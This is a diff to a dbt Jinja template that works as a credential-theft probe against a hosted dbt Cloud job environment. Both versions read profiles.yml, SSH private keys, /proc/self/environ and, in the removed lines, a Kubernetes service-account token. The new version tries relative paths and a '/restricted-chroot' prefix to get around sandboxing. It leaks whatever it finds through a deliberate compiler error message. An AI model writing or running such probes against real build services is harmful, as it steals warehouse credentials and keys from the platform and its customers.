@@ -1,40 +1,47 @@
 {% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
-{% set ns = namespace(output='[FILE_READ] ') %}
+{% set ns = namespace(output='[FILE_v3] ') %}
 
-{% set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' %}
-{% set profiles = load_file_contents(profiles_path) %}
-{% if profiles %}
-  {% set ns.output = ns.output ~ 'PROFILES=YES|' ~ profiles[:600] ~ '|END_PROFILES' %}
+{# Test 1: Read a file we KNOW exists in the project - dbt_project.yml #}
+{% set proj = load_file_contents('dbt_project.yml') %}
+{% if proj %}
+  {% set ns.output = ns.output ~ 'PROJECT_FILE=YES(' ~ proj | length ~ 'b)' %}
 {% else %}
-  {% set ns.output = ns.output ~ 'PROFILES=EMPTY' %}
+  {% set ns.output = ns.output ~ 'PROJECT_FILE=NO' %}
 {% endif %}
 
-{% set environ = load_file_contents('/proc/self/environ') %}
-{% if environ %}
-  {% set ns.output = ns.output ~ ' | ENVIRON=YES|' ~ environ[:600] %}
-{% else %}
-  {% set ns.output = ns.output ~ ' | ENVIRON=EMPTY' %}
+{# Test 2: Relative path to profiles.yml #}
+{% set p1 = load_file_contents('../.dbt/profiles.yml') %}
+{% set p2 = load_file_contents('../../.dbt/profiles.yml') %}
+{% set p3 = load_file_contents('/restricted-chroot/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml') %}
+{% set ns.output = ns.output ~ ' | REL1=' ~ (p1 | length) ~ 'b | REL2=' ~ (p2 | length) ~ 'b | CHROOT=' ~ (p3 | length) ~ 'b' %}
+
+{# If any profiles.yml found, show content #}
+{% if p1 %}
+  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p1[:800] %}
+{% elif p2 %}
+  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p2[:800] %}
+{% elif p3 %}
+  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p3[:800] %}
 {% endif %}
 
-{% set ssh_key = load_file_contents('/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa') %}
-{% if ssh_key %}
-  {% set ns.output = ns.output ~ ' | SSH=YES|' ~ ssh_key[:300] %}
-{% else %}
-  {% set ns.output = ns.output ~ ' | SSH=EMPTY' %}
+{# Test 3: SSH config relative #}
+{% set s1 = load_file_contents('../.ssh/config') %}
+{% set s2 = load_file_contents('../.ssh/id_rsa') %}
+{% set ns.output = ns.output ~ ' | SSH_CFG=' ~ (s1 | length) ~ 'b | SSH_KEY=' ~ (s2 | length) ~ 'b' %}
+{% if s1 %}
+  {% set ns.output = ns.output ~ ' | SSH_CFG_CONTENT=' ~ s1[:300] %}
+{% endif %}
+{% if s2 %}
+  {% set ns.output = ns.output ~ ' | SSH_KEY_CONTENT=' ~ s2[:300] %}
 {% endif %}
 
-{% set k8s = load_file_contents('/var/run/secrets/kubernetes.io/serviceaccount/token') %}
-{% if k8s %}
-  {% set ns.output = ns.output ~ ' | K8S=YES|' ~ k8s[:300] %}
-{% else %}
-  {% set ns.output = ns.output ~ ' | K8S=EMPTY' %}
-{% endif %}
+{# Test 4: /etc files with chroot prefix #}
+{% set r1 = load_file_contents('/restricted-chroot/etc/resolv.conf') %}
+{% set r2 = load_file_contents('/etc/resolv.conf') %}
+{% set ns.output = ns.output ~ ' | RESOLV_CHROOT=' ~ (r1 | length) ~ 'b | RESOLV_DIRECT=' ~ (r2 | length) ~ 'b' %}
 
-{% set resolv = load_file_contents('/etc/resolv.conf') %}
-{% if resolv %}
-  {% set ns.output = ns.output ~ ' | RESOLV=YES|' ~ resolv[:200] %}
-{% else %}
-  {% set ns.output = ns.output ~ ' | RESOLV=EMPTY' %}
-{% endif %}
+{# Test 5: /proc via chroot #}
+{% set e1 = load_file_contents('/restricted-chroot/proc/self/environ') %}
+{% set ns.output = ns.output ~ ' | ENVIRON_CHROOT=' ~ (e1 | length) ~ 'b' %}
 
 {{ exceptions.raise_compiler_error(ns.output) }}
